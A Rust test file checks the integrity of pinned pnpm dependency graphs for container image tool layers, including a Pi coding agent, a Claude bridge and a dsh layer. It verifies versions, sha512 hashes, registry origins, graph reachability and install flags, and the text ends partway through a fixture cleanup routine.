//! Standalone image-source integrity gates; no launcher dependencies.

use std::collections::{BTreeMap, BTreeSet};
use std::fmt;
use std::path::{Path, PathBuf};
use std::sync::OnceLock;

use serde::de::{self, MapAccess, SeqAccess, Visitor};
use serde::{Deserialize, Deserializer};
use serde_json::Value;

fn repo_path(relative: &str) -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("../../..")
        .join(relative)
}

fn read_text(relative: &str) -> String {
    let path = repo_path(relative);
    std::fs::read_to_string(&path)
        .unwrap_or_else(|error| panic!("read {}: {error}", path.display()))
}

fn read_json(relative: &str) -> Value {
    let text = read_text(relative);
    serde_json::from_str(&text).unwrap_or_else(|error| panic!("{relative} is valid JSON: {error}"))
}

fn pi_pin() -> String {
    read_json("images/tools/pi/package.json")["dependencies"]["@earendil-works/pi-coding-agent"]
        .as_str()
        .expect("the manifest pins pi")
        .to_string()
}

fn bridge_pin() -> String {
    read_json("images/tools/pi/bridge/package.json")["dependencies"]["pi-claude-bridge"]
        .as_str()
        .expect("the bridge manifest pins pi-claude-bridge")
        .to_string()
}

fn dsh_pin() -> String {
    read_json("images/tools/dsh/package.json")["dependencies"]["@deepseek-ai/dsh"]
        .as_str()
        .expect("the dsh manifest pins @deepseek-ai/dsh")
        .to_string()
}

/// The manifest-level pin of one migrated project: the manifest that declares
/// it and the dependency key. The lock's answers come from the graph adapter, so
/// no field here names an npm lock path.
struct PinSpec<'a> {
    dependency: &'a str,
}

/// The reviewed Pi family, in the two shapes the project has had. The default
/// `1.4.0` selection is the modern six; the `0.87.0` changed-selection leg keeps
/// the historical five. Both are named here rather than derived from the graph,
/// so a new or missing sibling is a review event.
const PI_FAMILY_MODERN: [&str; 6] = [
    "pi-agent-core",
    "pi-ai",
    "pi-codemode",
    "pi-mcp",
    "pi-telemetry",
    "pi-tui",
];
const PI_FAMILY_HISTORICAL: [&str; 5] =
    ["chord", "pi-agent-core", "pi-ai", "pi-telemetry", "pi-tui"];

/// The package-root `.bin` entries the reviewed family derives, as
/// sibling -> the bin-providing dependency identities. Independently authored
/// from the C4 investigation, which recorded the same table for the default
/// selection; the checker re-derives the targets from the provider manifests.
const PI_GENERATED_BINS: [(&str, &[&str]); 6] = [
    ("pi-agent-core", &["@earendil-works/pi-ai@1.4.0"]),
    ("pi-ai", &["@anthropic-ai/sdk@0.129.0"]),
    ("pi-codemode", &[]),
    ("pi-mcp", &[]),
    ("pi-telemetry", &[]),
    ("pi-tui", &["marked@18.0.11"]),
];

/// The reviewed package counts. These are review thresholds, not invariants: the
/// ticket asks for the changed count to be compared and reviewed, never for
/// "SRI and edges unchanged" to be assumed from an equal identity count.
const PI_DEFAULT_PACKAGES: usize = 120;
const BRIDGE_DEFAULT_PACKAGES: usize = 96;

/// The selected Pi root archive's registry SRI, independently taken from the
/// release metadata during the C4 delta review rather than read back from this
/// graph. It is the one identity every byte proof is anchored on.
const PI_ROOT_INTEGRITY: &str = "sha512-Z41LpZ3yYHSC/UUps6Mr39UMFPwH8elhJBG9DY1P7kuzsE5qSK/6eMj2EHzO5evJRQWLbKSqUMw+4nCNtIyiQg==";
const BRIDGE_ROOT_INTEGRITY: &str = "sha512-CaSXdCdMWLGcvvG4IZuKeyUIyLio2m8nEO7cUFZdxKPdkwWuf8Eq46Ys2z3VlSjCidlIpasLwiCdJStXSt6EZQ==";
/// The Claude Agent SDK package that must stay installed as JavaScript while its
/// eight platform payloads are the reviewed omission.
const BRIDGE_SDK_INTEGRITY: &str = "sha512-JTbluTKmY3wKQPIXzeCTvz/K0FElTuQU5Y7ueLgUOBrHcks8cHlGugEgIRezffhc13WzBAqYtaY15tJ+Bfunzg==";

// ---------------------------------------------------------------------------
// Migrated pnpm projects: one reviewed four-input set, read through the shared
// graph adapter (`recipe-contract pnpm-lock check|graph KIND PREFIX`)
// ---------------------------------------------------------------------------

/// One migrated project's reviewed inputs. `kind` is the adapter's own consumer
/// name, so a Pi prefix can never be read with the bridge policy by mistake.
///
/// The adapter is a **syntax** adapter, not a second parser: it owns YAML, the
/// pins, the workspace policy and the effective-peer rules
/// (`docs/adr/0001-build-only-pnpm-graph-parser.md`). Every expectation below is
/// hand-authored from the release metadata and the reviewed investigation, which
/// is why this is an independent control rather than a read-back of production
/// output.
struct MigratedProject {
    kind: &'static str,
    prefix: PathBuf,
}

impl MigratedProject {
    const INPUTS: [&'static str; 4] = [
        "package.json",
        "pnpm-lock.yaml",
        "pnpm-workspace.yaml",
        "pnpm-inputs.sha256",
    ];

    fn committed(kind: &'static str, relative: &str) -> Self {
        Self {
            kind,
            prefix: repo_path(relative),
        }
    }

    fn input(&self, file: &str) -> PathBuf {
        self.prefix.join(file)
    }

    /// After the activation commit no migrated project may keep an npm lock; the
    /// adapter also refuses one as an unreviewed input.
    fn carries_npm_lock(&self) -> bool {
        self.input("package-lock.json").exists()
    }

    fn has_four_inputs(&self) -> bool {
        Self::INPUTS.iter().all(|file| self.input(file).is_file())
    }
}

fn run_graph_cli(verb: &str, kind: &str, prefix: &Path) -> Result<String, String> {
    let binary = recipe_contract_binary();
    let output = std::process::Command::new(binary)
        .arg("pnpm-lock")
        .arg(verb)
        .arg(kind)
        .arg(prefix)
        .output()
        .map_err(|error| format!("cannot run {}: {error}", binary.display()))?;
    if !output.status.success() {
        return Err(format!(
            "pnpm-lock {verb} {kind} rejected {}: {}",
            prefix.display(),
            String::from_utf8_lossy(&output.stderr).trim()
        ));
    }
    String::from_utf8(output.stdout).map_err(|_| "pnpm-lock emitted non-UTF-8 output".to_string())
}

/// The `check` verb re-verifies the reviewed input digests, the workspace policy
/// and every effective peer, so its exact report is the selection version.
fn check_inputs(project: &MigratedProject) -> Result<String, String> {
    run_graph_cli("check", project.kind, &project.prefix)
}

fn read_graph(project: &MigratedProject) -> Result<GraphReport, String> {
    let text = run_graph_cli("graph", project.kind, &project.prefix)?;
    let value: Value = serde_json::from_str(&text)
        .map_err(|error| format!("graph report is not JSON: {error}"))?;
    GraphReport::from_value(&value, project.kind)
}

/// The committed four-input project at `committed`. The four inputs are one
/// unit, so an incomplete set is a hard failure rather than a skip.
fn committed_project(kind: &'static str, committed: &str) -> MigratedProject {
    let project = MigratedProject::committed(kind, committed);
    assert!(
        project.has_four_inputs(),
        "the committed {kind} project does not carry its four reviewed inputs"
    );
    project
}

fn pi_project() -> MigratedProject {
    committed_project("pi", "images/tools/pi")
}

fn bridge_project() -> MigratedProject {
    committed_project("bridge", "images/tools/pi/bridge")
}

/// The manifest's exact dependency pin for one root.
fn pinned_dependency(project: &MigratedProject, spec: &PinSpec) -> Result<String, String> {
    project_manifest(project)?["dependencies"][spec.dependency]
        .as_str()
        .map(str::to_owned)
        .ok_or_else(|| {
            format!(
                "the {} manifest does not pin {}",
                project.kind, spec.dependency
            )
        })
}

/// The project's own manifest, read from its prefix. A repo-relative path would
/// silently read the retired npm manifest while the proposals are reviewed.
fn project_manifest(project: &MigratedProject) -> Result<Value, String> {
    let path = project.input("package.json");
    let text = std::fs::read_to_string(&path)
        .map_err(|error| format!("cannot read {}: {error}", path.display()))?;
    serde_json::from_str(&text).map_err(|error| format!("{} is not JSON: {error}", path.display()))
}

/// The manifest, the image label and the graph select one version, and the
/// project is a private single-root pnpm project that asserts the base pin.
fn check_project_shape(
    project: &MigratedProject,
    manifest_name: &str,
    label_dependency: &str,
) -> Result<(), String> {
    let manifest = project_manifest(project)?;
    if manifest["name"].as_str() != Some(manifest_name) {
        return Err(format!("{manifest_name}: unexpected manifest name"));
    }
    if manifest["private"].as_bool() != Some(true) {
        return Err(format!("{manifest_name}: the project must be private"));
    }
    let dependencies = manifest["dependencies"]
        .as_object()
        .ok_or_else(|| format!("{manifest_name}: no dependencies"))?;
    let roots: Vec<&str> = dependencies.keys().map(String::as_str).collect();
    if roots != [label_dependency] {
        return Err(format!(
            "{manifest_name}: the project must have exactly one root, got {roots:?}"
        ));
    }
    if manifest.get("devDependencies").is_some() {
        return Err(format!("{manifest_name}: no development root is reviewed"));
    }
    let base = read_json("images/pnpm/pin.json")["version"]
        .as_str()
        .expect("the base pin carries a version")
        .to_string();
    if manifest["packageManager"] != format!("pnpm@{base}") {
        return Err(format!(
            "{manifest_name}: packageManager must assert the base pin pnpm@{base}"
        ));
    }
    if project.carries_npm_lock() {
        return Err(format!(
            "{manifest_name}: an npm project lock survived the migration"
        ));
    }
    Ok(())
}

/// The graph selects the same exact version as the manifest and the label, and
/// one importer edge reaches the root archive's own snapshot.
fn check_graph_pin_agrees(project: &MigratedProject, pinned: &str) -> Result<(), String> {
    let graph = read_graph(project)?;
    if graph.version != pinned {
        return Err(format!(
            "the graph selects {}, the manifest pins {pinned}",
            graph.version
        ));
    }
    if check_inputs(project)? != format!("{pinned}\n") {
        return Err("the pinned-input check reported another selection".to_string());
    }
    if graph.importer.len() != 1 {
        return Err(format!("{} imported roots", graph.importer.len()));
    }
    let root = &graph.importer[0];
    if !root.target.starts_with(&format!("{}@{pinned}", root.name)) {
        return Err(format!(
            "the root resolves to another selection: {}",
            root.target
        ));
    }
    if !graph.snapshots.iter().any(|entry| entry.key == root.target) {
        return Err("the imported root is not a graph snapshot".to_string());
    }
    Ok(())
}

/// Every archive carries a full sha512 SRI and the canonical npmjs tarball, and
/// every snapshot is reachable from the imported root. An unreachable archive or
/// snapshot is a payload addition with no reviewed edge.
fn check_graph_integrity_and_reachability(graph: &GraphReport) -> Result<(), String> {
    let missing: Vec<&str> = graph
        .packages
        .iter()
        .filter(|entry| !is_full_sha512(&entry.integrity))
        .map(|entry| entry.name.as_str())
        .collect();
    if !missing.is_empty() {
        return Err(format!(
            "these graph packages carry no full sha512 integrity: {missing:?}"
        ));
    }
    for archive in &graph.packages {
        let expected = format!("https://registry.npmjs.org/{}/-/", archive.name);
        if !archive.tarball.starts_with(&expected) {
            return Err(format!(
                "{} is not resolved from the canonical npmjs registry: {}",
                archive.name, archive.tarball
            ));
        }
    }
    let by_key: BTreeMap<&str, &GraphSnapshot> = graph
        .snapshots
        .iter()
        .map(|entry| (entry.key.as_str(), entry))
        .collect();
    let mut reached: BTreeSet<&str> = BTreeSet::new();
    let mut pending: Vec<&str> = graph
        .importer
        .iter()
        .map(|edge| edge.target.as_str())
        .collect();
    while let Some(key) = pending.pop() {
        if !reached.insert(key) {
            continue;
        }
        let snapshot = by_key
            .get(key)
            .ok_or_else(|| format!("edge target {key} has no snapshot"))?;
        pending.extend(snapshot.edges.iter().map(|edge| edge.target.as_str()));
    }
    if reached.len() != graph.snapshots.len() {
        return Err(format!(
            "{} snapshots are not reachable from the imported root",
            graph.snapshots.len() - reached.len()
        ));
    }
    let archives: BTreeSet<(&str, &str)> = graph
        .packages
        .iter()
        .map(|archive| (archive.name.as_str(), archive.version.as_str()))
        .collect();
    let snapshots: BTreeSet<(&str, &str)> = graph
        .snapshots
        .iter()
        .map(|snapshot| (snapshot.name.as_str(), snapshot.version.as_str()))
        .collect();
    if archives != snapshots {
        let extra: Vec<&(&str, &str)> = archives.difference(&snapshots).collect();
        return Err(format!(
            "orphan archive: {extra:?} has no resolved snapshot"
        ));
    }
    Ok(())
}

/// The Pi family: the selected root version for every reachable
/// `@earendil-works` sibling, one peer context each, in one reviewed shape. The
/// historical `yaml`/`esbuild`/`chord` members must not reappear in the modern
/// selection, and a duplicate or wrong-version sibling is the substitution the
/// byte proof would otherwise accept as "some sibling at that name".
fn check_pi_family(graph: &GraphReport) -> Result<(), String> {
    let root = &graph.importer[0].name;
    let reachable = reachable_keys(graph)?;
    // A family member reachable only through an optional edge is not installed
    // by a platform that omits it; the byte proof would then compare an archive
    // against a directory pnpm legitimately never created.
    let mut required: BTreeSet<&str> = BTreeSet::new();
    let mut optional: BTreeSet<&str> = BTreeSet::new();
    for edge in graph.importer.iter().chain(
        graph
            .snapshots
            .iter()
            .flat_map(|snapshot| snapshot.edges.iter()),
    ) {
        if edge.optional {
            optional.insert(edge.target.as_str());
        } else {
            required.insert(edge.target.as_str());
        }
    }
    let mut observed: BTreeMap<String, Vec<&str>> = BTreeMap::new();
    for key in &reachable {
        let identity = identity_of(graph, key)?;
        let Some(base) = identity.0.strip_prefix("@earendil-works/") else {
            continue;
        };
        if identity.0 == *root {
            continue;
        }
        if !PI_FAMILY_MODERN.contains(&base) && !PI_FAMILY_HISTORICAL.contains(&base) {
            return Err(format!(
                "{}@{} is reachable but is not a reviewed family name",
                identity.0, identity.1
            ));
        }
        observed.entry(base.to_string()).or_default().push(key);
    }
    let shape: Vec<String> = observed.keys().cloned().collect();
    let modern: Vec<String> = PI_FAMILY_MODERN
        .iter()
        .map(|name| (*name).to_string())
        .collect();
    let historical: Vec<String> = PI_FAMILY_HISTORICAL
        .iter()
        .map(|name| (*name).to_string())
        .collect();
    if shape != modern && shape != historical {
        return Err(format!(
            "reachable family {shape:?} is neither the modern {modern:?} nor the historical \
             {historical:?} shape"
        ));
    }
    for (base, keys) in &observed {
        if keys.len() != 1 {
            return Err(format!(
                "{base} is reachable in more than one peer context: {keys:?}"
            ));
        }
        if optional.contains(keys[0]) && !required.contains(keys[0]) {
            return Err(format!(
                "{base} is reachable only through an optional edge and would not always be                  installed"
            ));
        }
        let (_, version) = identity_of(graph, keys[0])?;
        if version != graph.version {
            return Err(format!(
                "{base}@{version} is reachable but the selection is {}",
                graph.version
            ));
        }
    }
    for banned in ["yaml", "esbuild", "chord"] {
        if shape.contains(&banned.to_string()) {
            return Err(format!(
                "the selection installs the retired family member {banned}"
            ));
        }
    }
    Ok(())
}

/// The generated package-root bin inventory, derived from the reviewed family's
/// own locked edges rather than from an installed tree. A sibling that gains or
/// loses a bin-providing dependency changes what pnpm links into `.bin`, so the
/// derivation is the control the byte checker normalises against.
fn check_pi_generated_bins(graph: &GraphReport, cells: &[(&str, &[&str])]) -> Result<(), String> {
    let reachable = reachable_keys(graph)?;
    for (base, expected) in cells {
        let name = format!("@earendil-works/{base}");
        let keys: Vec<&str> = reachable
            .iter()
            .copied()
            .filter(|key| {
                identity_of(graph, key)
                    .map(|identity| identity.0 == name)
                    .unwrap_or(false)
            })
            .collect();
        let [key] = keys.as_slice() else {
            return Err(format!("{base} is not reachable exactly once"));
        };
        let snapshot = graph
            .snapshots
            .iter()
            .find(|entry| entry.key == *key)
            .ok_or_else(|| format!("{base} has no snapshot"))?;
        let mut derived: Vec<String> = Vec::new();
        for edge in &snapshot.edges {
            let identity = identity_of(graph, &edge.target)?;
            let key = format!("{}@{}", identity.0, identity.1);
            let bin = graph
                .packages
                .iter()
                .find(|archive| archive.name == identity.0 && archive.version == identity.1)
                .ok_or_else(|| format!("{} has no archive record", key))?;
            if bin.has_bin {
                derived.push(key);
            }
        }
        derived.sort();
        let mut expected: Vec<String> = expected.iter().map(|item| (*item).to_string()).collect();
        expected.sort();
        if derived != expected {
            return Err(format!(
                "{base} derives generated bins {derived:?}, the reviewed table says {expected:?}"
            ));
        }
    }
    Ok(())
}

/// No resolved bridge identity is a package Pi's extension loader aliases to its
/// own copy. A **peer declaration** naming one is legitimate and required: Pi
/// supplies that peer through jiti, so only an installed identity is an offence.
fn check_no_loader_aliased_pi_package(graph: &GraphReport) -> Result<(), String> {
    const ALIASED: [&str; 6] = [
        "@earendil-works/",
        "@sinclair/typebox",
        "typebox",
        "pi-agent-core",
        "pi-tui",
        "pi-ai",
    ];
    let root = &graph.importer[0].name;
    let offending: Vec<String> = graph
        .packages
        .iter()
        .filter(|archive| {
            archive.name != *root && ALIASED.iter().any(|aliased| archive.name.contains(aliased))
        })
        .map(|archive| format!("{}@{}", archive.name, archive.version))
        .collect();
    if !offending.is_empty() {
        return Err(format!(
            "the bridge installs packages Pi's loader aliases: {offending:?}"
        ));
    }
    Ok(())
}

/// The Claude Agent SDK stays as JavaScript and its eight platform payloads stay
/// omitted. The SDK is what the bridge's loader needs; the platform packages are
/// the reviewed `ignoredOptionalDependencies` omission, so a payload that appears
/// is an un-reviewed ~197 MiB addition and a missing JS package is a broken
/// bridge.
fn check_bridge_sdk_omission(graph: &GraphReport) -> Result<(), String> {
    let sdk = graph
        .packages
        .iter()
        .find(|archive| archive.name == "@anthropic-ai/claude-agent-sdk")
        .ok_or_else(|| "the bridge does not install the Claude Agent SDK JavaScript".to_string())?;
    if sdk.integrity != BRIDGE_SDK_INTEGRITY {
        return Err(format!(
            "the Claude Agent SDK SRI is {}, not the reviewed {BRIDGE_SDK_INTEGRITY}",
            sdk.integrity
        ));
    }
    let payloads: Vec<String> = graph
        .packages
        .iter()
        .filter(|archive| archive.name.starts_with("@anthropic-ai/claude-agent-sdk-"))
        .map(|archive| format!("{}@{}", archive.name, archive.version))
        .collect();
    if !payloads.is_empty() {
        return Err(format!(
            "the bridge ships the omitted SDK platform payloads: {payloads:?}"
        ));
    }
    Ok(())
}

/// `--omit=optional` and `--legacy-peer-deps` are mandatory on the layer's
/// active `npm ci`: the lock carries the Claude Agent SDK's eight optional
/// native binaries, so dropping `--omit=optional` silently adds ~197 MiB, and
/// dropping `--legacy-peer-deps` lets npm drag in a second, version-skewed Pi.
///
/// Only **active** command text counts: a commented-out `npm ci` must neither
/// satisfy the requirement nor mask a later active invocation missing a flag.
/// A missing active invocation fails rather than letting an empty scan pass, and
/// **every** active `npm ci` invocation - bare or flagged - must carry all three
/// flags. Trailing shell comments are stripped first, so a mandatory flag that
/// exists only after a `#` is never accepted as present.
fn check_bridge_install_flags(script: &str) -> Result<(), String> {
    // The bridge is installed by the reviewed base pnpm through the shared hard
    // runner. These are the reviewed argv facts (frozen lock, scripts off, copy
    // import) and the workarounds that must never come back: the reviewed
    // hoisted workspace omits only the SDK platform packages, so `--no-optional`
    // (a pnpm 11.11.0 lockfile bug), `--legacy-peer-deps` (npm), a second
    // Pi/typebox (an alias/NODE_PATH) and a bridge absence producer are all
    // retired rather than translated.
    const REQUIRED: [&str; 4] = [
        "install --prod --frozen-lockfile",
        "--ignore-scripts",
        "--package-import-method=copy",
        "--config.trust-policy=no-downgrade",
    ];
    const FORBIDDEN: [&str; 6] = [
        "npm ci",
        "--legacy-peer-deps",
        "--no-optional",
        "--omit=optional",
        "NODE_PATH=",
        "absent-transport",
    ];
    let active: String = script
        .lines()
        .filter(|line| !line.trim_start().starts_with('#'))
        .map(strip_shell_comment)
        .collect::<Vec<_>>()
        .join("\n");
    if !active.contains("run-pnpm.sh") {
        return Err("install-pi-packages.sh does not use the shared hard runner".to_string());
    }
    for flag in REQUIRED {
        if !active.contains(flag) {
            return Err(format!("the frozen install argv dropped {flag}"));
        }
    }
    for retired in FORBIDDEN {
        if active.contains(retired) {
            return Err(format!(
                "install-pi-packages.sh carries the retired {retired}"
            ));
        }
    }
    Ok(())
}

/// The part of a shell line before an unquoted `#` comment, with the comment and
/// its `#` removed. A `#` opens a comment only at the start of a word (line start
/// or after whitespace), matching `/bin/sh`, so a `#` inside a word is literal.
/// This keeps a flag that lives only in a trailing comment out of the flag check.
fn strip_shell_comment(line: &str) -> &str {
    let mut in_single = false;
    let mut in_double = false;
    let mut word_start = true;
    for (index, ch) in line.char_indices() {
        match ch {
            '\'' if !in_double => in_single = !in_single,
            '"' if !in_single => in_double = !in_double,
            '#' if !in_single && !in_double && word_start => return &line[..index],
            _ => {}
        }
        word_start = ch.is_whitespace();
    }
    line
}

fn reachable_keys(graph: &GraphReport) -> Result<BTreeSet<&str>, String> {
    let mut reached: BTreeSet<&str> = BTreeSet::new();
    let mut pending: Vec<&str> = graph
        .importer
        .iter()
        .map(|edge| edge.target.as_str())
        .collect();
    while let Some(key) = pending.pop() {
        if !reached.insert(key) {
            continue;
        }
        let snapshot = graph
            .snapshot(key)
            .ok_or_else(|| format!("edge target {key} has no snapshot"))?;
        pending.extend(snapshot.edges.iter().map(|edge| edge.target.as_str()));
    }
    Ok(reached)
}

fn identity_of(graph: &GraphReport, key: &str) -> Result<(String, String), String> {
    let snapshot = graph
        .snapshot(key)
        .ok_or_else(|| format!("edge target {key} has no snapshot"))?;
    Ok((snapshot.name.clone(), snapshot.version.clone()))
}

// ---------------------------------------------------------------------------
// Pinned dsh layer: one reviewed pnpm project read through the shared CLI
// ---------------------------------------------------------------------------

/// One resolved archive as the graph module reported it.
#[derive(Clone)]
struct GraphArchive {
    name: String,
    version: String,
    integrity: String,
    tarball: String,
    has_bin: bool,
    platform: GraphPlatform,
    optional: bool,
    /// The archive's declared peer ranges. A declaration is not a resolution, so
    /// a bridge may declare Pi as a peer while installing no Pi identity.
    peers: Vec<(String, String)>,
}

/// The archive's `os`/`cpu`/`libc` selectors, retained in list order.
#[derive(Clone)]
struct GraphPlatform {
    os: Vec<String>,
    cpu: Vec<String>,
    libc: Vec<String>,
}

/// One resolved snapshot: the full peer-context identity key, the package
/// identity it resolves, and its own optional annotation, which is a separate
/// fact from an edge's optional flag.
#[derive(Clone)]
struct GraphSnapshot {
    key: String,
    name: String,
    version: String,
    optional: bool,
    edges: Vec<GraphEdge>,
}

/// One importer or snapshot dependency edge.
#[derive(Clone)]
struct GraphEdge {
    name: String,
    target: String,
    optional: bool,
}

/// A typed read of `recipe-contract pnpm-lock graph dsh`. A syntax adapter, never
/// a second parser: the composed helper owns YAML, pins and the effective-peer
/// rules (`docs/adr/0001-build-only-pnpm-graph-parser.md`), so Rust only types
/// what it printed and asserts independently authored expectations over it.
#[derive(Clone)]
struct GraphReport {
    version: String,
    packages: Vec<GraphArchive>,
    snapshots: Vec<GraphSnapshot>,
    importer: Vec<GraphEdge>,
}

fn graph_report_bool(value: &Value, path: &[&str]) -> Result<bool, String> {
    let mut current = value;
    for key in path {
        current = current
            .get(*key)
            .ok_or_else(|| format!("graph report has no {}", path.join(".")))?;
    }
    current
        .as_bool()
        .ok_or_else(|| format!("graph report field {} is not a boolean", path.join(".")))
}

fn graph_report_strings(value: &Value, path: &[&str]) -> Result<Vec<String>, String> {
    let mut current = value;
    for key in path {
        current = current
            .get(*key)
            .ok_or_else(|| format!("graph report has no {}", path.join(".")))?;
    }
    current
        .as_array()
        .ok_or_else(|| format!("graph report field {} is not an array", path.join(".")))?
        .iter()
        .map(|entry| {
            entry.as_str().map(str::to_owned).ok_or_else(|| {
                format!(
                    "graph report field {} has a non-string entry",
                    path.join(".")
                )
            })
        })
        .collect()
}

fn graph_report_field(value: &Value, path: &[&str]) -> Result<String, String> {
    let mut current = value;
    for key in path {
        current = current
            .get(*key)
            .ok_or_else(|| format!("graph report has no {}", path.join(".")))?;
    }
    current
        .as_str()
        .map(str::to_owned)
        .ok_or_else(|| format!("graph report field {} is not a string", path.join(".")))
}

impl GraphReport {
    fn from_value(value: &Value, kind: &str) -> Result<Self, String> {
        let reported = graph_report_field(value, &["selection", "kind"])?;
        if reported != kind {
            return Err(format!("graph report is for {reported}, not {kind}"));
        }
        let mut packages = Vec::new();
        for entry in value
            .get("packages")
            .and_then(Value::as_array)
            .ok_or_else(|| "graph report has no packages array".to_string())?
        {
            packages.push(GraphArchive {
                name: graph_report_field(entry, &["id", "name"])?,
                version: graph_report_field(entry, &["id", "version"])?,
                integrity: graph_report_field(entry, &["integrity"])?,
                tarball: graph_report_field(entry, &["tarball"])?,
                has_bin: graph_report_bool(entry, &["hasBin"])?,
                platform: GraphPlatform {
                    os: graph_report_strings(entry, &["platform", "os"])?,
                    cpu: graph_report_strings(entry, &["platform", "cpu"])?,
                    libc: graph_report_strings(entry, &["platform", "libc"])?,
                },
                optional: graph_report_bool(entry, &["optional"])?,
                peers: entry
                    .get("peers")
                    .and_then(Value::as_object)
                    .ok_or_else(|| "graph archive has no peers object".to_string())?
                    .iter()
                    .map(|(name, range)| {
                        range
                            .as_str()
                            .map(|range| (name.clone(), range.to_string()))
                            .ok_or_else(|| format!("peer range of {name} is not a string"))
                    })
                    .collect::<Result<Vec<_>, String>>()?,
            });
        }
        let mut snapshots = Vec::new();
        for entry in value
            .get("snapshots")
            .and_then(Value::as_array)
            .ok_or_else(|| "graph report has no snapshots array".to_string())?
        {
            snapshots.push(GraphSnapshot {
                key: graph_report_field(entry, &["id", "key"])?,
                name: graph_report_field(entry, &["id", "packageId", "name"])?,
                version: graph_report_field(entry, &["id", "packageId", "version"])?,
                optional: graph_report_bool(entry, &["optional"])?,
                edges: entry
                    .get("edges")
                    .and_then(Value::as_array)
                    .ok_or_else(|| "graph snapshot has no edges array".to_string())?
                    .iter()
                    .map(|edge| {
                        Ok::<GraphEdge, String>(GraphEdge {
                            name: graph_report_field(edge, &["name"])?,
                            target: graph_report_field(edge, &["target"])?,
                            optional: graph_report_bool(edge, &["optional"])?,
                        })
                    })
                    .collect::<Result<Vec<_>, String>>()?,
            });
        }
        let mut importer = Vec::new();
        for entry in value
            .get("importer")
            .and_then(Value::as_array)
            .ok_or_else(|| "graph report has no importer array".to_string())?
        {
            importer.push(GraphEdge {
                name: graph_report_field(entry, &["name"])?,
                target: graph_report_field(entry, &["target"])?,
                optional: graph_report_bool(entry, &["optional"])?,
            });
        }
        Ok(Self {
            version: graph_report_field(value, &["selection", "version"])?,
            packages,
            snapshots,
            importer,
        })
    }

    fn snapshot(&self, key: &str) -> Option<&GraphSnapshot> {
        self.snapshots.iter().find(|entry| entry.key == key)
    }

    fn packages_named<'a>(&'a self, name: &'a str) -> impl Iterator<Item = &'a GraphArchive> {
        self.packages.iter().filter(move |entry| entry.name == name)
    }

    fn package(&self, name: &str, version: &str) -> Option<&GraphArchive> {
        self.packages
            .iter()
            .find(|entry| entry.name == name && entry.version == version)
    }

    fn carries(&self, name: &str) -> bool {
        self.packages.iter().any(|entry| entry.name == name)
    }
}

fn native_context_matches(context: &Path, native: &str) -> bool {
    match std::fs::read_to_string(context.join("out/.recipe-contract-platform")) {
        Ok(text) => text.trim() == native,
        Err(error) => error.kind() == std::io::ErrorKind::NotFound,
    }
}

#[test]
fn native_context_record_is_enforced() {
    let tree = HelperTree::copy("native-context-record");
    assert!(native_context_matches(&tree.directory, "darwin-arm64"));
    tree.write("out/.recipe-contract-platform", b"linux-arm64\n");
    assert!(!native_context_matches(&tree.directory, "darwin-arm64"));
    assert!(native_context_matches(&tree.directory, "linux-arm64"));
}

/// The composed helper this suite executes: the exported context when it is this
/// host's own build, else the native adapter's output. A source checkout holds no
/// binary, so the adapter is the only legitimate supplier.
fn recipe_contract_binary() -> &'static Path {
    static BINARY: OnceLock<PathBuf> = OnceLock::new();
    BINARY.get_or_init(|| {
        let arch = match std::env::consts::ARCH {
            "aarch64" => "arm64",
            "x86_64" => "amd64",
            other => other,
        };
        let native = format!("{}-{arch}", std::env::consts::OS);
        if let Some(context) = std::env::var_os("RECIPE_CONTRACT_CONTEXT").map(PathBuf::from) {
            let binary = context.join("out/recipe-contract");
            if binary.is_file() && native_context_matches(&context, &native) {
                return binary;
            }
        }
        let adapter = repo_path("script/build/recipe-contract.sh");
        let output = std::process::Command::new("bash")
            .arg(&adapter)
            .arg("--native")
            .output()
            .unwrap_or_else(|error| panic!("cannot run {}: {error}", adapter.display()));
        assert!(
            output.status.success(),
            "native recipe-contract build failed: {}",
            String::from_utf8_lossy(&output.stderr).trim()
        );
        let context = String::from_utf8(output.stdout)
            .expect("adapter printed non-UTF-8 output")
            .trim()
            .to_string();
        let binary = PathBuf::from(context).join("out/recipe-contract");
        assert!(binary.is_file(), "native build published no binary");
        binary
    })
}

/// Every case computes the fixture pins with an independent hash, so a stale
/// digest can never be the reason a mutation is rejected.
fn rejected_graph_mutation(
    source: &MigratedProject,
    label: &str,
    mutate: impl FnOnce(&ProjectFixture),
    expected: &str,
) {
    let fixture = ProjectFixture::copy(source, label);
    mutate(&fixture);
    fixture.repin();
    let error = match read_graph(&fixture.project) {
        Ok(_) => panic!(
            "{label}: the mutated {} project must not validate",
            source.kind
        ),
        Err(error) => error,
    };
    assert!(
        error.contains(expected),
        "{label}: expected {expected:?} in the rejection, got {error:?}"
    );
}

/// A disposable copy of one project's four reviewed inputs. Mutation controls
/// need the intended structural gate to be the one that rejects, so the fixture
/// can recompute the pin file as test data after an edit.
struct ProjectFixture {
    directory: PathBuf,
    project: MigratedProject,
}

impl ProjectFixture {
    fn copy(source: &MigratedProject, label: &str) -> Self {
        let directory = std::env::temp_dir().join(format!(
            "image-sources-{}-{}-{label}",
            source.kind,
            std::process::id()
        ));
        let _ = std::fs::remove_dir_all(&directory);
        std::fs::create_dir_all(&directory).expect("fixture directory");
        for file in MigratedProject::INPUTS {
            std::fs::copy(source.input(file), directory.join(file))
                .unwrap_or_else(|error| panic!("copy {}: {error}", source.input(file).display()));
        }
        Self {
            directory: directory.clone(),
            project: MigratedProject {
                kind: source.kind,
                prefix: directory,
            },
        }
    }

    fn rewrite(&self, file: &str, edit: impl FnOnce(&str) -> String) {
        let path = self.directory.join(file);
        let before = std::fs::read_to_string(&path).expect("read fixture input");
        let after = edit(&before);
        assert_ne!(
            after, before,
            "{file}: the mutation must change the fixture"
        );
        std::fs::write(&path, after).expect("write fixture input");
    }

    fn write(&self, file: &str, content: &str) {
        std::fs::write(self.directory.join(file), content).expect("write fixture input");
    }

    fn repin(&self) {
        // Independent hashes keep negative graph mutations outside the production pin writer.
        const SCRIPT: &str = "const fs=require('node:fs'),crypto=require('node:crypto'),path=require('node:path');const prefix=process.argv[1];fs.writeFileSync(path.join(prefix,'pnpm-inputs.sha256'),['package.json','pnpm-lock.yaml','pnpm-workspace.yaml'].map(file=>crypto.createHash('sha256').update(fs.readFileSync(path.join(prefix,file))).digest('hex')+'  '+file+'\\n').join(''));";
        let output = std::process::Command::new("node")
            .arg("-e")
            .arg(SCRIPT)
            .arg(&self.directory)
            .output()
            .expect("run node to re-pin the fixture");
        assert!(
            output.status.success(),
            "fixture re-pin failed: {}",
            String::from_utf8_lossy(&output.stderr)
        );
    }
}

impl Drop for ProjectFixture {
    fn drop(&mut self) {
